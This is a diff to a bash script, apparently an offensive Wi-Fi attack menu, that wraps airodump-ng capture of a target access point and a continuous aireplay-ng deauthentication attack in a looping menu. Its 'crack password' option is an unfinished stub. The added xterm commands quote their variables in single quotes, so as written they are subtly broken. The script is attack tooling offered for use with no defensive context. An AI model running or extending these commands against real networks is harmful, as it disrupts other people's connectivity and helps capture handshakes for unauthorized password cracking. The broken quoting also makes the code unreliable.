@@ -32,6 +32,8 @@ sleep 2
 echo -e 'Please make a copy of Bssid and Channel Then Press Enter To Proceed.....\e[0m'
 read
 clear 
+option=0
+while true; do
 echo -e '\e[92m##           ###     ########  ##    ##  ########  ####'
 echo -e '##          ## ##         ##    ##  ##   ##         ##'
 echo -e '##         ##   ##       ##      ####    ##         ##'
@@ -51,18 +53,40 @@ echo -e '|    [3] crack password                               |'
 echo -e '|                                                     |'
 echo -e '|    [4] clean capture files                          |'
 echo -e '|                                                     |'
+echo -e '|    [5] Exit                                         |'
 echo -e ':::::::::::::::::::::::::::::::::::::::::::::::::::::::'
 echo -n 'Lazy--> '
-read option
-while [ $option == 1 ]
-do 
+	read option
+	case $option in
+	
+	1)
 	echo -n 'Please Specify Bssid: '
 	read id
 	echo -n 'Please Specify Channel: '
-	read chnl
-	echo -n 'Please Specify a Capture File name: '
-	read file
-	sleep 2
-	gnome-terminal -- airodump-ng --bssid $id --channel $chnl --write $file $int
-break
+        read chnl
+	echo -n 'Please Specify capture file name: '
+        read file
+	xterm -e 'airodump-ng --bssid $id --channel $chnl --write $file $int'
+	;;
+	2)
+	clear
+	xterm -e 'aireplay-ng --deauth 0 -a $id $int'
+	;;
+	3)
+	clear
+	echo -e '3rd also'
+	;;
+	4)
+	clear
+	echo -e 'good to go'
+	;;
+	5)
+	clear
+	break
+	;;
+	*)
+	clear
+	echo -e 'wrong!'
+	;;
+	esac
 done
